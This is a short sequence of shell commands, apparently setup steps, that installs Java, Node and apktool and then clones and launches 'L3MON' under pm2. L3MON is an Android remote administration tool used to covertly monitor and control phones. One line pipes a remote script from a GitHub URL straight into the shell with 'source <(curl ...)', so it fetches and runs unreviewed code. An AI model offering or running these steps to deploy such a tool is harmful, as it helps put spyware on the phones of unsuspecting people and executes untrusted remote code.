apt update
apt upgrade
apt install wget curl git npm nano nodejs openjdk-8-jdk openjdk-8-jre -y
source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-kali-ubuntu.sh)
 git clone https://github.com/efxtv/L3MON
 cd L3MON
 npm install pm2 -g
npm install
npm audit fix
npm audit
pm2 start index.js
pm2 startup
pm2 stop index.js
